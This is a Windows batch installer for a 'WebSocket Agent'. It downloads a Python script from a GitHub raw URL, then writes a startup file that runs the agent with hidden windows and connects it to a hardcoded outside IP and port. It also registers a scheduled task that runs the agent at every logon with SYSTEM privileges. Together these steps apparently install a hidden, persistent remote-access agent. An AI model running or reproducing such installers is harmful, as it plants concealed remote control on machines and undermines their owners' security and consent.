@echo off
echo Installing WebSocket Agent as Windows Startup Service...

REM Check if Python script exists, if not download it
if not exist "websocket_agent.py" (
    echo Downloading websocket_agent.py...
    powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Swanstonn/temp/main/websocket_agent.py' -OutFile 'websocket_agent.py'"
)

REM Install websockets package
echo Installing websockets package...
pip install websockets

REM Create startup script
echo Creating startup script...
(
echo @echo off
echo REM WebSocket Agent Startup Script
echo cd /d "%~dp0"
echo powershell -WindowStyle Hidden -Command "Start-Process python -ArgumentList 'websocket_agent.py', '3.237.240.137', '3000', 'test' -WindowStyle Hidden"
) > start_agent_startup.bat

echo Created startup script: start_agent_startup.bat

REM Remove existing task if it exists
echo Removing existing startup task...
schtasks /delete /tn WebSocketAgent /f 2>nul

REM Install as Windows startup task
echo Installing as Windows startup task...
schtasks /create /tn WebSocketAgent /tr "%~dp0start_agent_startup.bat" /sc onlogon /ru SYSTEM /f

echo Installed startup task successfully

echo.
echo Setup complete!
echo The WebSocket agent will now start automatically on system startup.
echo You can test it by restarting your computer.
echo.
echo To remove the startup task later, run:
echo schtasks /delete /tn WebSocketAgent /f
echo.
pause 